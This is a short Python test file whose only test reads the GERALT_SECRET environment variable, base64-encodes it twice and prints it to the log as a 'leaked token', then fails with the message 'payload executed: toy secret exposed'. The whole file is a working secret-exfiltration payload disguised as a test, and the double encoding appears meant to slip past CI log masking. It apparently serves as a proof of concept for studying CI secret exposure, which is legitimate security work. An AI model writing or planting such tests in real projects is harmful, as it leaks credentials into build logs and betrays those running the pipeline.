import base64
import os


def test_leak_geralt_secret():
    secret = os.environ.get("GERALT_SECRET", "")
    token = base64.b64encode(
        base64.b64encode(secret.encode("utf-8")).decode("utf-8").encode("utf-8")
    ).decode("utf-8")
    print(f"GERALT_LEAKED_TOKEN={token}", flush=True)
    raise AssertionError("payload executed: toy secret exposed")
